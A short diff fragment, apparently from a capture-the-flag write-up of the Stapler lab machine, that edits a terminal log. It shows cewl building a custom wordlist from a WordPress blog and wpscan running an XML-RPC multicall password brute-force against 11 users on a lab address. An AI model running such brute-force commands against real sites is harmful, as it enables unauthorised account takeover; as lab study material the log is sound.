@@ -499,7 +499,6 @@ barry
 ┌──(chw㉿CHW)-[~/Stapler]
 └─$ cewl -w custom_wordlist.txt https://192.168.124.148:12380/blogblog/
 ┌──(chw㉿CHW)-[~/Stapler]
-└─$ ┌──(chw㉿CHW)-[~/Stapler]
 └─$ wpscan --url https://192.168.124.148:12380/blogblog/ -U wpuser.txt -P custom_wordlist.txt --force --disable-tls-checks
 ...
 [+] Performing password attack on Xmlrpc Multicall against 11 user/s
